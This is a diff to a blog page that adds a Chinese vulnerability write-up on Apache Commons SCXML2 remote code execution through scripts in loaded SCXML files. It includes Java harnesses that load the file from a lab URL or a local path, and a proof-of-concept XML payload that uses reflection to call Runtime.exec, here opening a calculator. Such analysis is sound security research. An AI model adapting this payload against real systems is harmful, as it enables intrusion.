@@ -518,6 +518,87 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="zad">
+      <meta itemprop="description" content="不忘初心,方得始终">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zad's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">apache scxml2 远程代码执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-07 13:29:21" itemprop="dateCreated datePublished" datetime="2023-02-07T13:29:21+08:00">2023-02-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-02-17 13:33:13" itemprop="dateModified" datetime="2025-02-17T13:33:13+08:00">2025-02-17</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><ul>
+<li>这是一个远程加载xml文件的jexl表达式代码执行漏洞</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先分析SCXMLReader这个类，该方法有许多read方法的重载，有直接传入InputStream和String URl等等</p>
+<p><img src="/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/image-20230213142745-re2g3br.png" alt="image"></p>
+<p>我们来看传入InPutStream的这个方法，【1】传入scxmlStream会调用read方法，在[3]出会调用readInternal进行进一步解析</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SCXML <span class="title function_">read</span><span class="params">(InputStream scxmlStream)</span> <span class="keyword">throws</span> IOException, ModelException, XMLStreamException &#123;</span><br><span class="line">    <span class="keyword">return</span> read(scxmlStream, <span class="keyword">new</span> <span class="title class_">Configuration</span>()); 【<span class="number">1</span>】</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SCXML <span class="title function_">read</span><span class="params">(InputStream scxmlStream, Configuration configuration)</span> <span class="keyword">throws</span> IOException, ModelException, XMLStreamException &#123;</span><br><span class="line">    <span class="keyword">if</span> (scxmlStream == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Cannot parse null InputStream&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     【<span class="number">3</span>】<span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> readInternal(configuration, (URL)<span class="literal">null</span>, (String)<span class="literal">null</span>, scxmlStream, (Reader)<span class="literal">null</span>, (Source)<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (scxml != <span class="literal">null</span>) &#123;</span><br><span class="line">            ModelUpdater.updateSCXML(scxml);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> scxml;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在readInternal方法中前面两个if语句都是为false(如果我们最开始是通过重载的传入的参数是url对象的时候，这里就会进入第二个if语句中)，直接跟如getReader中</p>
+<p><img src="/2023/02/07/apache-scxml2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/image-20230213143042-q9i4c15.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境搭建如下，因为aliyunmaven 目前并没有scxml2的依赖，所以我是本地导入的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-scxml2&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">2.0</span>&lt;/version&gt;</span><br><span class="line">  &lt;scope&gt;system&lt;/scope&gt;</span><br><span class="line">  &lt;systemPath&gt;/Users/Downloads/commons-scxml2-<span class="number">2.0</span>-SNAPSHOT.jar&lt;/systemPath&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-logging&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-jexl&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">2.1</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 执行 scxml 实例的引擎</span></span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="comment">// 将 SCXML URL 解析为 SCXML 模型</span></span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(<span class="string">&quot;http://172.16.132.228:8081/1.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置状态机（scxml 实例）执行</span></span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.util.StreamUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.io.SCXMLReader;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.model.SCXML;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> BUFFER_LENGTH=<span class="number">512</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line">        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/kuaile/idea_code/Apache_SCXML_Rce2/src/test/poc.xml&quot;</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">        <span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(in);</span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1.xml</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt; </span><br><span class="line">&lt;scxml xmlns=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> version=<span class="string">&quot;1.0&quot;</span> initial=<span class="string">&quot;r1un&quot;</span>&gt; </span><br><span class="line">&lt;state id=<span class="string">&quot;r1un&quot;</span>&gt; </span><br><span class="line">&lt;onentry&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line"><span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&#x27;java.lang.Runtime.getRuntime().exec(&quot;open -a calculator&quot;);&#x27;</span>)</span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;/onentry&gt; </span><br><span class="line">&lt;/state&gt; </span><br><span class="line">&lt;/scxml&gt;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zn-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/26/%E9%87%91%E8%9D%B6%E5%A4%A9%E7%87%95%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -798,7 +879,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
